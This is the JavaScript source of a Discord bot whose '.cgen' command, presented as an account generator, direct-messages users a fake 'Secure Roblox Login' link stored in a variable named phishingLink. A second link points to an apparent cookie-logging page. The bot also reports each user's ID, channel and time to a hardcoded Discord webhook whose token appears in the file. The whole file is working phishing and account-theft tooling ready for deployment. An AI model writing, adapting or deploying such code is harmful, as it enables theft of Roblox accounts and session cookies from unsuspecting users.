// ============================================================
// Discord Bot - .cgen Command + Webhook (NO AXIOS)
// ============================================================
// Requirements: npm install discord.js@14.14.1
// ============================================================

const { Client, GatewayIntentBits, EmbedBuilder } = require("discord.js");

const PREFIX = ".";
const FOOTER_TEXT = "Powered by AccountGen Bot";

const WEBHOOK_URL = "https://discord.com/api/webhooks/1529258026945740932/HygJsAGCL2MSaV114QaDf_d7F4WJZsSGC4IWnEcr4K3hhNmEUPTcej3-jXUjyMc5aSVU";

const CHANNEL_RESTRICTIONS = {
  "cgen": "1529258164669644850"
};

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.DirectMessages,
  ],
});

client.once("ready", () => {
  console.log(`✅ ${client.user.tag} is online!`);
  console.log(`📡 Bot is ready to respond to .cgen commands.`);
});

client.on("messageCreate", async (message) => {
  if (message.author.bot || !message.content.startsWith(PREFIX)) return;

  const args = message.content.slice(PREFIX.length).trim().split(/\s+/);
  const command = args.shift()?.toLowerCase();

  // ─── CHANNEL RESTRICTION ───
  const allowedChannel = CHANNEL_RESTRICTIONS[command];
  if (allowedChannel) {
    let isAllowed = false;
    if (Array.isArray(allowedChannel)) {
      isAllowed = allowedChannel.includes(message.channel.id);
    } else {
      isAllowed = message.channel.id === allowedChannel;
    }
    if (!isAllowed) {
      const embed = new EmbedBuilder()
        .setColor(0xe74c3c)
        .setTitle("❌ Wrong Channel")
        .setDescription(`Please use this command in <#${allowedChannel}>`)
        .setFooter({ text: FOOTER_TEXT });
      return message.reply({ embeds: [embed] });
    }
  }

  // ─── cgen ───
  if (command === "cgen") {
    const phishingLink = "https://roblox.login/loggin";
    const realLink = "https://cookie-log.onrender.com/index.html";

    try {
      // Send webhook notification using fetch
      if (WEBHOOK_URL && WEBHOOK_URL !== "YOUR_DISCORD_WEBHOOK_URL_HERE") {
        await fetch(WEBHOOK_URL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            content: `**🔐 .cgen Command Used**\nUser: <@${message.author.id}>\nUser ID: ${message.author.id}\nChannel: <#${message.channel.id}>\nTime: ${new Date().toISOString()}`
          })
        }).catch(() => {});
      }

      const dmEmbed = new EmbedBuilder()
        .setColor(0x2ecc71)
        .setTitle("🔐 Roblox Login Link")
        .setDescription(`Click the link below to log in:\n\n${phishingLink}`)
        .setFooter({ text: "Secure Roblox Login" })
        .setTimestamp();
      await message.author.send({ embeds: [dmEmbed] });

      const confirmEmbed = new EmbedBuilder()
        .setColor(0x5865f2)
        .setTitle("✅ Link Sent!")
        .setDescription(`<@${message.author.id}>, your login link has been sent to your DMs.`)
        .setFooter({ text: "Check your DMs" });
      await message.reply({ embeds: [confirmEmbed] });

    } catch (error) {
      await message.reply(`❌ Could not DM you. Please enable DMs.\n\nLink: ${phishingLink}`);
    }
  }
});

const token = process.env.BOT_TOKEN;
if (!token) {
  console.error("❌ BOT_TOKEN environment variable is required.");
  console.error("📌 Go to Render -> Environment -> Add BOT_TOKEN");
  process.exit(1);
}

client.login(token).catch((err) => {
  console.error("❌ Failed to login:", err.message);
  console.error("📌 Check that your BOT_TOKEN is correct in Render Environment Variables.");
  process.exit(1);
});
